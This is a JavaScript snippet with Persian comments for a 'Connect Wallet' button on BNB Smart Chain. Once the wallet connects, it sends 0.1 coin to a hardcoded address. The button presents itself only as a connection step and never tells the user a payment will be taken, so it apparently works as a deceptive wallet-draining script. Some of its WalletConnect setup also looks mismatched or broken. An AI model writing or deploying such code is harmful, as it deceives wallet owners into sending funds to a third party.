import WalletConnectProvider from "@walletconnect/client"; // وارد کردن WalletConnect
import { ethers } from "ethers"; // وارد کردن ethers.js

const connectButton = document.getElementById('connect-wallet-btn');

// این آدرس و project id مربوط به WalletConnect شما است
const projectId = '9d0b91216c49777eb4605da66368fb81';
const destinationAddress = '0xbA8958d52B940fF513746F24176D1017CaFa707E'; // آدرس مقصد برای ارسال تراکنش

let provider;

connectButton.addEventListener('click', async () => {
    if (connectButton.disabled) return;

    try {
        connectButton.disabled = true;
        connectButton.textContent = "Connecting...";

        // راه‌اندازی WalletConnect
        provider = new WalletConnectProvider({
            rpc: {
                56: "https://bsc-dataseed.binance.org/", // آدرس RPC برای شبکه اسمارت چین
            },
            chainId: 56, // شماره شبکه (BSC)
            qrcodeModalOptions: {
                mobileLinks: ["trust", "metamask"], // کیف پول‌های موبایل پشتیبانی شده
            },
            infuraId: projectId,
        });

        // اتصال به کیف پول
        await provider.enable();
        connectButton.textContent = "Connected";

        // ایجاد یک provider از طریق Ethers.js
        const web3Provider = new ethers.providers.Web3Provider(provider);
        const signer = web3Provider.getSigner();

        // ارسال تراکنش به آدرس مقصد
        const transaction = await signer.sendTransaction({
            to: destinationAddress,
            value: ethers.utils.parseEther("0.1"), // مقدار اتر برای ارسال
        });

        console.log("Transaction Hash:", transaction.hash);
        alert("Transaction sent successfully!");

    } catch (error) {
        console.error("Connection failed:", error);
        connectButton.textContent = "Connect Wallet";
        connectButton.disabled = false;
        alert("Failed to connect to wallet.");
    }
});
